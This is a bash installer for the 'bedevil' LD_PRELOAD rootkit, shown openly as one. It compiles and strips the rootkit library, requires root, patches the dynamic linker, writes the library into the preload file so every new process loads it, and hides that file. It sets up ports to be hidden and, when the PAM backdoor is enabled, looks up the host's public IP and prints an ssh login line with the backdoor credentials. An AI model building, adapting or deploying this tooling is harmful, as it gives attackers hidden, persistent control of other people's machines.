#!/bin/bash

tty -s && clear && [ -f .ascii ] &&
    printf "\e[1m\e[31m`cat .ascii`\e[0m\n"

# random stuff.
source ./etc/random.sh

# miscellaneous functions.
source ./etc/util.sh

# default values for things.
source ./etc/defaults.sh

# contains, mainly, functions for use with dialog.
# 'show_yesno' checks for dialog support/use and shows
# input prompt depending on whether or not we can/want to use
# dialog.
source ./etc/dialog.sh

# handles (automatic?) reading & writing of/to 'toggles.h'
source ./etc/toggles.sh

# functions for fetching essential rootkit header
# directories & paths included by includes.h
source ./etc/headers.sh

# functions responsible for locating & then writing C arrays.
source ./etc/arrays.sh

# the functions within this script handle setting up
# ports & ranges to be hidden before writing them
# to their destination.
source ./etc/hideports.sh

# the functions in this script are what makes the
# magic happen when it comes to finding & writing
# rootkit settings. the entire system that was birthed
# from this script was just pretty bad all round. slow
# was an understatement. but this is the case no longer.
source ./etc/settings.sh

# prepares our environment.
source ./etc/postinstall.sh

compile_bdvl(){
    [ ! -d "$NEW_MDIR" ] && {
        eecho "'$0 -d' first";
        exit;
    }

    local warning_flags optimization_flags \
          options linker_options linker_flags

    warning_flags=(-Wall)
    optimization_flags=(-O0 -g0)
    options=(-fomit-frame-pointer -fPIC)
    linker_options=(-Wl,--build-id=none)
    linker_flags=(-lc -ldl -lpcap)
    [ `toggle_enabled USE_CRYPT` == "true" ] && linker_flags+=(-lcrypt)
    [ $PLATFORM == "armv7l" ] && PLATFORM="v7l"
    [ $PLATFORM == "armv6l" ] && PLATFORM="v6l"

    # build the commands for both. then execute 
    local compile_reg="gcc -std=gnu99 ${optimization_flags[*]} $NEW_MDIR/bedevil.c ${warning_flags[*]} ${options[*]}
                      -I$NEW_MDIR -shared ${linker_flags[*]} ${linker_options[*]} -o $BDVLSO.$PLATFORM"
    local compile_m32="gcc -m32 -std=gnu99 ${optimization_flags[*]} $NEW_MDIR/bedevil.c ${warning_flags[*]} ${options[*]}
                      -I$NEW_MDIR -shared ${linker_flags[*]} ${linker_options[*]} -o $BDVLSO.i686"

    # only show gcc output if we want to output verbosely.
    [ $VERBOSE == 1 ] && $compile_reg
    [ $VERBOSE == 0 ] && $compile_reg &>/dev/null
    strip $BDVLSO.$PLATFORM 2>/dev/null || { eecho "Couldn't strip $BDVLSO.$PLATFORM, exiting"; exit; }
    secho "`lib_size $PLATFORM`"

    [ $VERBOSE == 1 ] && { $compile_m32 || wecho "Couldn't compile $BDVLSO.i686"; }
    [ $VERBOSE == 0 ] && $compile_m32 &>/dev/null
    [ -f $BDVLSO.i686 ] && strip $BDVLSO.i686 2>/dev/null
    [ -f $BDVLSO.i686 ] && secho "`lib_size i686`"
}

install_bdvl(){
    [ `id -u` != 0 ] && { \
        eecho "Not root. Cannot continue..." && \
        exit; \
    }

    secho "Starting full installation!\n"
    wecho "All essential dependencies must be present!"
    wecho "You can install them with '$0 -D' before continuing\n"

    if [ -f "`bin_path xxd`" ]; then
        local response="$(show_yesno "Patch dynamic linker libs?")"
        if [ $response == 0 ]; then
            necho "Patching dynamic linker libraries, please wait..."
            LDSO_PRELOAD="`etc/patch_libdl.sh -op | tail -n 1`"   # change default LDSO_PRELOAD to new
                                                                  # preload file location.
            secho "Finished patching dynamic linker"
        fi; echo
    else
        eecho "Cannot patch the dynamic linker as xxd was not found."
        eecho "Did you install your dependencies?? :^) ('$0 -D')"
        eecho "Do this, then try again."
        wecho "Press enter if you would like to continue anyway..."
        read
    fi

    # get installation specific settings & compile rootkit
    setup_configuration
    compile_bdvl

    # after successful compilation, copy rootkit shared object(s) to install dir
    echo && necho "Installing to \$INSTALL_DIR ($INSTALL_DIR)"
    [ ! -d $INSTALL_DIR ] && mkdir -p $INSTALL_DIR/
    [ -f $BDVLSO.$PLATFORM ] && cp $BDVLSO.$PLATFORM $INSTALL_DIR/
    [ -f $BDVLSO.i686 ] && cp $BDVLSO.i686 $INSTALL_DIR/

    export ${BD_VAR}=1
    # setup the rootkit's installation directory before setting up the rootkit's preload file.
    setup_home $INSTALL_DIR

    # after installing the rootkit to its directory and enabling anything that may need it, we
    # can go ahead with having every new process henceforth preload the rootkit.
    necho "Writing \$SOPATH to \$LDSO_PRELOAD"
    echo -n "$SOPATH" > $LDSO_PRELOAD && hide_path $LDSO_PRELOAD
    secho "Installation complete!"
    cleanup_bdvl

    if [ "`toggle_enabled "USE_PAM_BD"`" == 'true' ]; then
        local addr_src='http://wtfismyip.com/text'
        [ -f `bin_path curl` ] && local addr_q="curl -s $addr_src"
        [ -f `bin_path wget` ] && local addr_q="wget -q -O - $addr_src"
        secho "bash etc/ssh.sh $BD_UNAME `$addr_q` $PAM_PORT # $BD_PWD"
    fi
}

VERBOSE=0
USE_DIALOG=0
DOCOMPRESS=0
USAGE="
  Usage: $0 [option(s)]
      Options:
          -h: Show this help message & exit.
          -v: Output verbosely.
          -e: Do an environment check. (RECOMMENDED)
          -u: Enable use of 'dialog' throughout setup.
          -t: Go through & switch rootkit toggles.
          -C: Clean up installation/compilation mess.
          -d: Configure rootkit headers & settings.
          -z: After configuration has finished, compress the resulting
              new include directory with gzip.
          -c: Compile rootkit in current directory & exit.
          -D: Install all potential required dependencies. (REQUIRES ROOT)
          -i: Launch full installation of bedevil. (REQUIRES ROOT)
"

while getopts "hvuetCzdcDi?" opt; do
    case "$opt" in
    h)
        echo "$USAGE"
        exit
        ;;
    v)
        secho "Outputting verbosely"
        VERBOSE=1
        ;;
    u)
        [ ! -f `bin_path dialog` ] && eecho "Could not find dialog..."
        [ -f `bin_path dialog` ] && USE_DIALOG=1
        ;;
    e)
        bash etc/environ.sh
        ;;
    t)
        [ $USE_DIALOG == 1 ] &&
            dialog_set_toggles || set_toggles
        ;;
    z)
        necho "Going to compress $NEW_MDIR once it is created"
        DOCOMPRESS=1
        ;;
    d)  
        setup_configuration
        ;;
    c)
        compile_bdvl
        ;;
    C)
        cleanup_bdvl
        ;;
    i)
        install_bdvl
        exit
        ;;
    D)
        bash etc/install_deps.sh
        ;;
    ?)
        echo "$USAGE"
        exit
        ;;
    esac
done

[ $OPTIND == 1 ] || [[ $1 != "-"* ]] && { echo "$USAGE"; exit; }
[ $USE_DIALOG == 1 ] && clear